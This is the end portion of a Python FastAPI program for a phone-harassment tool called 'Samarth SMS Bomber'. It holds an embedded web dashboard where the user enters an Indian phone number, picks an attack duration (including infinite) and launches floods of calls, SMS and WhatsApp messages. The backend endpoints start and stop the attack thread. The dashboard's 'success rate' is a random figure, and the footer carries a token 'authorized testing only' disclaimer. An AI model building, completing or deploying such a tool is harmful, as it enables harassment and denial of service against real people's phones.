QUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>

    <!-- Main Content -->
    <div class="relative z-10 max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-10">
        
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-8">
            <div class="flex items-center gap-4">
                <div class="w-12 h-12 lg:w-14 lg:h-14 rounded-xl bg-gradient-to-br from-blue-600 to-purple-600 flex items-center justify-center text-2xl shadow-lg shadow-blue-500/20">
                    ✉️
                </div>
                <div>
                    <h1 class="text-2xl lg:text-4xl font-extrabold tracking-tight">
                        <span class="text-blue-400">Samarth</span>
                        <span class="text-yellow-400">SMS</span>
                        <span class="text-white">Bomber</span>
                    </h1>
                    <p class="text-[10px] text-gray-500 tracking-[0.15em] mt-0.5 flex items-center gap-2">
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        PREMIUM EDITION
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        v3.0
                    </p>
                </div>
            </div>
            <div class="flex items-center gap-3 flex-wrap">
                <!-- Theme Toggle -->
                <div class="toggle-premium" onclick="toggleTheme()" id="themeToggle">
                    <span id="themeIcon">🌙</span>
                    <span class="text-gray-400">Mode</span>
                </div>
                <!-- Sound Toggle -->
                <div class="toggle-premium" onclick="toggleSound()" id="soundToggle">
                    <span id="soundIcon">🔊</span>
                    <span class="text-gray-400">Sound</span>
                </div>
                <div class="badge-premium">
                    <span class="dot-premium idle" id="statusDot"></span>
                    <span id="statusText" class="text-gray-400">System Ready</span>
                </div>
                <div class="hidden sm:block text-[10px] text-gray-500 font-mono" id="timestamp"></div>
            </div>
        </header>

        <!-- Divider -->
        <div class="divider-premium w-full mb-8"></div>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-premium rounded-2xl p-6">
                <h2 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2 mb-5">
                    <span>🎯</span> Target Lock
                </h2>
                <div class="space-y-4">
                    <div>
                        <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">Mobile Number</label>
                        <div class="relative">
                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm font-semibold">+91</span>
                            <input id="phone" maxlength="10"
                                   class="input-premium"
                                   placeholder="Enter 10-digit number"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,''); validateNumber(this.value)">
                        </div>
                        <div id="phoneFeedback" class="text-xs mt-1.5 h-5"></div>
                    </div>
                    
                    <!-- Timer -->
                    <div>
                        <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">⏱️ Attack Duration</label>
                        <select id="timerDuration" class="select-premium">
                            <option value="0">♾️ Infinite</option>
                            <option value="10">10 Seconds</option>
                            <option value="30">30 Seconds</option>
                            <option value="60">60 Seconds</option>
                            <option value="120">2 Minutes</option>
                            <option value="300">5 Minutes</option>
                            <option value="600">10 Minutes</option>
                        </select>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="startAttack()" id="startBtn"
                                class="col-span-2 btn-premium py-4 text-sm flex items-center justify-center gap-2">
                            <span>🚀</span> Launch Attack
                        </button>
                        <button onclick="stopAttack()" id="stopBtn"
                                class="col-span-2 hidden btn-premium btn-danger py-4 text-sm flex items-center justify-center gap-2">
                            <span>🛑</span> Stop Attack
                        </button>
                    </div>
                    
                    <!-- Export -->
                    <button onclick="exportStats()" id="exportBtn"
                            class="w-full btn-ghost py-2.5 rounded-xl text-xs font-medium text-gray-400 transition-all flex items-center justify-center gap-2">
                        📊 Export Statistics
                    </button>
                    
                    <div class="grid grid-cols-3 gap-2 p-3 bg-black/30 rounded-xl border border-white/5">
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">APIs</div>
                            <div class="text-sm font-bold text-blue-400" id="apiCount">0</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Interval</div>
                            <div class="text-sm font-bold text-cyan-400">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target</div>
                            <div class="text-sm font-bold text-yellow-400 truncate" id="targetDisplay">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats -->
            <div class="lg:col-span-7 glass-premium rounded-2xl p-6">
                <div class="flex justify-between items-center mb-5">
                    <h2 class="text-sm font-semibold text-yellow-400 tracking-wider flex items-center gap-2">
                        <span>📊</span> Live Metrics
                    </h2>
                    <span class="text-xs text-gray-500 font-mono" id="cycleDisplay">Cycles: 0</span>
                </div>
                <div class="grid grid-cols-3 gap-3">
                    <div class="stat-premium">
                        <div class="stat-number" id="calls">0</div>
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">📞 Calls</div>
                        <div class="progress-premium"><div class="progress-fill" id="callBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-premium">
                        <div class="stat-number" id="sms">0</div>
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">✉️ SMS</div>
                        <div class="progress-premium"><div class="progress-fill" id="smsBar" style="width:0%"></div></div>
                    </div>
                    <div class="stat-premium">
                        <div class="stat-number" id="wa">0</div>
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">💬 WhatsApp</div>
                        <div class="progress-premium"><div class="progress-fill" id="waBar" style="width:0%"></div></div>
                    </div>
                </div>
                <div class="grid grid-cols-2 gap-3 mt-4">
                    <div class="glass-light rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Total Hits</div>
                        <div class="text-xl font-bold text-white" id="totalHits">0</div>
                    </div>
                    <div class="glass-light rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Success Rate</div>
                        <div class="text-xl font-bold text-emerald-400" id="successRate">—</div>
                    </div>
                </div>
                <!-- Timer Display -->
                <div class="mt-3 p-2 bg-black/30 rounded-lg border border-white/5 text-center">
                    <span class="text-xs text-gray-500">⏱️ </span>
                    <span class="timer-premium" id="timerDisplay">No timer set</span>
                </div>
            </div>

            <!-- Logs -->
            <div class="lg:col-span-12 glass-premium rounded-2xl p-6">
                <div class="flex justify-between items-center mb-3">
                    <h3 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2">
                        <span>📜</span> Event Log
                    </h3>
                    <span class="text-[10px] text-gray-500 font-mono">Live Feed</span>
                </div>
                <div id="logs" class="logs-premium bg-black/30 rounded-xl p-3 border border-white/5"></div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="mt-8 pt-4 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-3 text-[10px] text-gray-600">
            <span>⚡ Authorized testing only · All endpoints public</span>
            <div class="flex items-center gap-4">
                <span>🔒 Encrypted</span>
                <span>·</span>
                <span id="apiCountFooter">⚡ 0 APIs</span>
                <span>·</span>
                <span id="uptime">Uptime: 0s</span>
            </div>
        </footer>
    </div>

    <script>
        const API_COUNT = 28;
        let isRunning = false;
        let statusInterval = null;
        let startTime = Date.now();
        let soundEnabled = true;
        let timerInterval = null;
        let isLight = false;

        // ===== THEME TOGGLE =====
        function toggleTheme() {
            isLight = !isLight;
            document.body.style.background = isLight ? '#f0f4ff' : '#0a0e1a';
            document.querySelectorAll('.glass-premium').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.7)' : 'rgba(10,14,26,0.7)';
                el.style.borderColor = isLight ? 'rgba(37,99,235,0.08)' : 'rgba(255,255,255,0.06)';
            });
            document.querySelectorAll('.input-premium').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.5)';
                el.style.color = isLight ? '#0f172a' : '#e2e8f0';
            });
            document.querySelectorAll('.stat-premium').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.4)' : 'rgba(0,0,0,0.4)';
            });
            document.querySelectorAll('.select-premium').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.8)' : 'rgba(0,0,0,0.5)';
                el.style.color = isLight ? '#0f172a' : '#e2e8f0';
            });
            document.querySelectorAll('.glass-light').forEach(el => {
                el.style.background = isLight ? 'rgba(255,255,255,0.5)' : 'rgba(255,255,255,0.03)';
            });
            document.getElementById('themeIcon').textContent = isLight ? '☀️' : '🌙';
        }

        // ===== SOUND TOGGLE =====
        function toggleSound() {
            soundEnabled = !soundEnabled;
            document.getElementById('soundIcon').textContent = soundEnabled ? '🔊' : '🔇';
        }

        // ===== SOUND FUNCTIONS =====
        function playSound(id) {
            if (!soundEnabled) return;
            try {
                const audio = document.getElementById(id);
                audio.currentTime = 0;
                audio.play().catch(() => {});
            } catch(e) {}
        }
        function playWrongSound() { playSound('wrongSound'); }
        function playAttackSound() { playSound('attackSound'); }
        function playNiceSound() { playSound('niceSound'); }

        // ===== NUMBER VALIDATION =====
        let lastValidation = '';
        function validateNumber(value) {
            const feedback = document.getElementById('phoneFeedback');
            if (value.length > 0 && value.length < 10) {
                feedback.innerHTML = '<span class="text-red-400 text-xs">⚠️ Must be 10 digits</span>';
                if (value !== lastValidation) {
                    playWrongSound();
                    lastValidation = value;
                }
            } else if (value.length === 10) {
                feedback.innerHTML = '<span class="text-emerald-400 text-xs">✅ Valid number</span>';
                playNiceSound();
            } else {
                feedback.innerHTML = '';
            }
        }

        // ===== HEART ANIMATION =====
        function showHeartAnimation() {
            const overlay = document.getElementById('heartOverlay');
            overlay.classList.remove('active');
            void overlay.offsetWidth;
            overlay.classList.add('active');
            setTimeout(() => {
                overlay.classList.remove('active');
            }, 3000);
        }

        // ===== EXPORT =====
        function exportStats() {
            const data = {
                target: document.getElementById('targetDisplay').textContent,
                timestamp: new Date().toISOString(),
                stats: {
                    calls: document.getElementById('calls').textContent,
                    sms: document.getElementById('sms').textContent,
                    whatsapp: document.getElementById('wa').textContent,
                    total: document.getElementById('totalHits').textContent,
                    cycles: document.getElementById('cycleDisplay').textContent.replace('Cycles: ', '')
                }
            };
            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `attack_stats_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
            a.click();
            URL.revokeObjectURL(url);
            playNiceSound();
        }

        // ===== TIMESTAMP =====
        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').textContent = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        }
        setInterval(updateTimestamp, 1000);
        updateTimestamp();

        // ===== UPTIME =====
        setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(elapsed / 3600);
            const m = Math.floor((elapsed % 3600) / 60);
            const s = elapsed % 60;
            document.getElementById('uptime').textContent = `Uptime: ${h}h ${m}m ${s}s`;
        }, 1000);

        // ===== START ATTACK =====
        async function startAttack() {
            const phone = document.getElementById('phone').value.trim();
            if (phone.length !== 10) {
                playWrongSound();
                document.getElementById('phone').style.borderColor = '#ef4444';
                document.getElementById('phone').style.boxShadow = '0 0 30px rgba(239,68,68,0.15)';
                setTimeout(() => {
                    document.getElementById('phone').style.borderColor = '';
                    document.getElementById('phone').style.boxShadow = '';
                }, 3000);
                return;
            }
            const duration = parseInt(document.getElementById('timerDuration').value);
            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone, duration})
                });
                const data = await res.json();
                if (data.status === 'success') {
                    playAttackSound();
                    showHeartAnimation();
                    isRunning = true;
                    document.getElementById('startBtn').classList.add('hidden');
                    document.getElementById('stopBtn').classList.remove('hidden');
                    document.getElementById('statusDot').className = 'dot-premium active';
                    document.getElementById('statusText').textContent = 'Attack Active';
                    document.getElementById('statusText').style.color = '#ef4444';
                    document.getElementById('targetDisplay').textContent = `+91${phone}`;
                    if (duration > 0) {
                        document.getElementById('timerDisplay').textContent = `⏱️ ${duration}s remaining`;
                        if (timerInterval) clearInterval(timerInterval);
                        let remaining = duration;
                        timerInterval = setInterval(() => {
                            remaining--;
                            if (remaining <= 0) {
                                clearInterval(timerInterval);
                                document.getElementById('timerDisplay').textContent = '⏱️ Timer expired';
                            } else {
                                document.getElementById('timerDisplay').textContent = `⏱️ ${remaining}s remaining`;
                            }
                        }, 1000);
                    } else {
                        document.getElementById('timerDisplay').textContent = '♾️ Infinite mode';
                    }
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        // ===== STOP ATTACK =====
        async function stopAttack() {
            try {
                await fetch('/stop', {method: 'POST'});
                isRunning = false;
                document.getElementById('startBtn').classList.remove('hidden');
                document.getElementById('stopBtn').classList.add('hidden');
                document.getElementById('statusDot').className = 'dot-premium idle';
                document.getElementById('statusText').textContent = 'Stopped';
                document.getElementById('statusText').style.color = '';
                if (timerInterval) clearInterval(timerInterval);
                document.getElementById('timerDisplay').textContent = 'No timer set';
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        // ===== POLL STATUS =====
        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const d = await res.json();
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    document.getElementById('calls').textContent = calls;
                    document.getElementById('sms').textContent = sms;
                    document.getElementById('wa').textContent = wa;
                    document.getElementById('totalHits').textContent = total;
                    document.getElementById('cycleDisplay').textContent = `Cycles: ${d.cycles}`;
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById('callBar').style.width = ((calls / maxVal) * 100) + '%';
                    document.getElementById('smsBar').style.width = ((sms / maxVal) * 100) + '%';
                    document.getElementById('waBar').style.width = ((wa / maxVal) * 100) + '%';
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById('successRate').textContent = rate.toFixed(1) + '%';
                    }
                    const logsDiv = document.getElementById('logs');
                    if (d.logs && d.logs.length) {
                        logsDiv.innerHTML = d.logs.map(l => `<div class="log-entry">${l}</div>`).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6">⏳ Awaiting attack...</div>';
                    }
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById('startBtn').classList.remove('hidden');
                        document.getElementById('stopBtn').classList.add('hidden');
                        document.getElementById('statusDot').className = 'dot-premium idle';
                        document.getElementById('statusText').textContent = 'Attack Ended';
                        document.getElementById('statusText').style.color = '';
                        if (timerInterval) clearInterval(timerInterval);
                        document.getElementById('timerDisplay').textContent = 'No timer set';
                    }
                } catch(e) {
                    console.error('Poll error:', e);
                }
            }, 1200);
        }

        // ===== INIT =====
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('apiCount').textContent = API_COUNT;
            document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 System initialized · Ready for action</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(request: Request):
    try:
        body = await request.json()
        phone = body.get('phone', '')
        duration = body.get('duration', 0)
        if len(phone) != 10:
            return {"status": "error", "message": "Invalid phone number"}
        if attack_status["running"]:
            return {"status": "error", "message": "Attack already running"}
        threading.Thread(target=lambda: asyncio.run(run_attack(phone, duration)), daemon=True).start()
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:50]
    }

if __name__ == "__main__":
    import uvicorn
    print("✉️ Samarth SMS Bomber — Premium Edition")
    print(f"📱 Loaded {len(ULTIMATE_APIS)} APIs")
    print("🌐 http://localhost:5000")
    uvicorn.run(app, host="0.0.0.0", port=5000)
